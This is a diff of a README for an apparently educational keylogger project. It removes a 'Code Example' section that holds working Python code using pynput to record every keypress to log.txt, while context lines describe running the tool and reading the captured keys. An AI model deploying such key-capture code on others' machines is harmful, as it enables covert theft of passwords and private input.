@@ -76,31 +76,6 @@ Follow these steps to install and run the keylogger on your local machine:
 
    Open `log.txt` to view the captured keystrokes. Each keypress will be recorded on a new line.
 
----
-
-## Code Example
-
-Below is the core code of the keylogger:
-
-```python
-# Install the pynput library
-# pip install pynput
-
-from pynput.keyboard import Listener
-
-def log_keystroke(key):
-    # Convert key to string and remove unwanted characters
-    key = str(key).replace("'", "")
-    
-    # Write the captured key to a log file
-    with open("log.txt", "a") as f:
-        f.write(key + "\n")
-
-# Set up the listener to log keypress events
-with Listener(on_press=log_keystroke) as listener:
-    listener.join()
-```
-
 This code listens for keyboard events using the `pynput` library and appends every keypress to a text file called `log.txt`.
 
 ---
